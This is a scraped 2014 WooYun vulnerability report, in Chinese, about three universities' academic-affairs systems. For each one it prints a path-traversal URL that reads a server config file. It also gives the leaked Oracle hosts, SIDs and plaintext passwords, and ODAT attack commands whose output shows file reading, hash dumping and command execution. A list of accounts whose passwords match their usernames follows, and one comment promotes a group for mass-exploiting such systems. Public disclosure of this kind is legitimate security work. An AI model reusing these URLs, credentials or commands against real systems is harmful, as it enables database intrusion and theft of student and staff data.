{"id": 51903, "wybug_id": "wooyun-2014-073002", "wybug_title": "多所大学Oracle密码泄露并暴露外网", "wybug_corp": "CCERT教育网应急响应组", "wybug_author": "动后河", "wybug_date": "2014-08-19 12:58", "wybug_open_date": "2014-08-24 13:00", "wybug_type": "重要敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(CCERT教育网应急响应组)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感信息泄露"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-24：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 配置文件读取密码，外网成功连接，并用ODAT测试了一下 详细说明：  青岛理工大学：发现：URP教务系统文件读取漏洞读取地址：http://211.64.192.44:8080/servlet/com.runqian.base.util.ReadJavaScriptServlet?file=../../../../../../../conf/resin.conf========================================================读取到：Server：211.64.192.42Sid：JWAccout：newjwPassword：qtechedu001newjw外网居然可以连接，图片wooyun传不上，Oracle sql handler连接上的图片就不传了。用ODAT测试一下可用功能和账号与密码相同的账号：ODAT连接测试结果作为漏洞证明。ODAT：\nroot@bogon:~/Desktop/odat-master# python odat.py all -s 211.64.192.42 -d JW -U newjw -P qtechedu001newjw[1] (211.64.192.42:1521): Testing all modules on the JW SID with the newjw/qtechedu001newjw account[1.1] UTL_HTTP library ?[+] OK[1.2] HTTPURITYPE library ?[+] OK[1.3] UTL_FILE library ?[+] OK[1.4] JAVA library ?[-] KO[1.5] DBMSADVISOR library ?[+] OK[1.6] DBMSSCHEDULER library ?[+] OK[1.7] CTXSYS library ?[+] OK[1.8] Hashed Oracle passwords ?[+] OK[1.9] Hashed Oracle passwords from history?[-] KO[1.10] DBMS_XSLPROCESSOR library ?[+] OK[1.11] External table to read files ?[+] OK[1.12] External table to execute system commands ?[+] OK[1.13] Oradbg ?[-] KO[1.14] DBMS_LOB to read files ?[+] OK[1.15] CVE-2012-3137 library ?[+] I can't know if it is vulnerable[2] (211.64.192.42:1521): Oracle users have not the password identical to the username ?100% |#########################################################| Time: 00:00:13 [-] No found a valid account on 211.64.192.42:1521/JW\nODAT测试结果：无账号与密码相同的账号可读文件，获得hash密码，执行命令，扫描端口等   漏洞证明：  太原理工大学：发现：URP教务系统文件读取漏洞读取地址：http://jwcurp.tyut.edu.cn:8064/servlet/com.runqian.base.util.ReadJavaScriptServlet?file=../../../../../../../conf/resin.conf========================================================读取到：Server：202.207.247.43Sid：orclAccout：newjwPassword：tyut2013newjwgwJWC外网居然可以连接，图片wooyun传不上，Oracle sql handler连接上的图片就不传了。ODAT连接测试结果作为漏洞证明。ODAT：\nroot@bogon:~/Desktop/odat-master# python odat.py all  -s 202.207.247.43 -d orcl -U SYGL -P SYGL[1] (202.207.247.43:1521): Testing all modules on the orcl SID with the SYGL/SYGL account[1.1] UTL_HTTP library ?[-] KO[1.2] HTTPURITYPE library ?[-] KO[1.3] UTL_FILE library ?[-] KO[1.4] JAVA library ?[-] KO[1.5] DBMSADVISOR library ?[-] KO[1.6] DBMSSCHEDULER library ?[-] KO[1.7] CTXSYS library ?[-] KO[1.8] Hashed Oracle passwords ?[-] KO[1.9] Hashed Oracle passwords from history?[-] KO[1.10] DBMS_XSLPROCESSOR library ?[-] KO[1.11] External table to read files ?[-] KO[1.12] External table to execute system commands ?[-] KO[1.13] Oradbg ?[-] KO[1.14] DBMS_LOB to read files ?[+] OK[1.15] CVE-2012-3137 library ?[+] I can't know if it is vulnerable[2] (202.207.247.43:1521): Oracle users have not the password identical to the username ?The login NEWJW3 has already been tested at least once. What do you want to do: - stop (s/S)- continue and ask every time (a/A)- continue without to ask (c/C)s100% |#########################################################| Time: 00:00:04 [-] No found a valid account on 202.207.247.43:1521/orcl\nODAT测试结果：无账号与密码相同的账号可读文件东北农业大学：发现：URP教务系统文件读取漏洞读取地址：http://202.118.167.85/servlet/com.runqian.base.util.ReadJavaScriptServlet?file=../../../../../../../conf/resin.conf========================================================读取到：Server：202.118.167.87Sid：urpjwAccout：newjwPassword：newjw外网居然可以连接，图片wooyun传不上，Oracle sql handler连接上的图片就不传了。ODAT连接测试结果作为漏洞证明。ODAT：\nroot@bogon:~/Desktop/odat-master# python odat.py all  -s 202.118.167.87 -d urpjw -U newjw -P newjw[1] (202.118.167.87:1521): Testing all modules on the urpjw SID with the newjw/newjw account[1.1] UTL_HTTP library ?[+] OK[1.2] HTTPURITYPE library ?[+] OK[1.3] UTL_FILE library ?[+] OK[1.4] JAVA library ?[-] KO[1.5] DBMSADVISOR library ?[+] OK[1.6] DBMSSCHEDULER library ?[+] OK[1.7] CTXSYS library ?[+] OK[1.8] Hashed Oracle passwords ?[+] OK[1.9] Hashed Oracle passwords from history?[-] KO[1.10] DBMS_XSLPROCESSOR library ?[+] OK[1.11] External table to read files ?[+] OK[1.12] External table to execute system commands ?[+] OK[1.13] Oradbg ?[-] KO[1.14] DBMS_LOB to read files ?[+] OK[1.15] CVE-2012-3137 library ?[+] I can't know if it is vulnerable[2] (202.118.167.87:1521): Oracle users have not the password identical to the username ?100% |#########################################################| Time: 00:00:31 [+] Accounts found on 202.118.167.87:1521/urpjw: {'NEWJWZD': 'NEWJWZD', 'WWWCJLR': 'WWWCJLR', 'WEB_BKS': 'WEB_BKS', 'JXPG': 'JXPG', 'WWWBKS': 'WWWBKS', 'CWSF': 'CWSF', 'NEWJWBLOB': 'NEWJWBLOB', 'NEWJW': 'NEWJW', 'JW_ZX': 'JW_ZX'}\nODAT测试结果：账号与密码相同的账号 -> {'NEWJWZD', 'WWWCJLR', 'WEB_BKS','JXPG', 'WWWBKS', 'CWSF', 'NEWJWBLOB',  'NEWJW', 'JW_ZX'}可读文件，获得hash密码，执行命令，扫描端口等   修复方案：  修复文件读取漏洞数据库服务器禁外网连接另：审核小妹纸太辛苦了！   版权声明：转载请注明来源 动后河@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-08-24 13:00 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-03 17:56 |    \t\twellsun \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | www.wellsun.com)\t\t \n  欢迎大家加入通杀教务系统漏洞QQ 群： 310068074    \n     2015-08-31 16:25 |    \t\t北京清元优软科技有限公司(乌云厂商)\t\t \n  此漏洞已经修改，并已经联系相关学校升级，谢谢你的提交    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}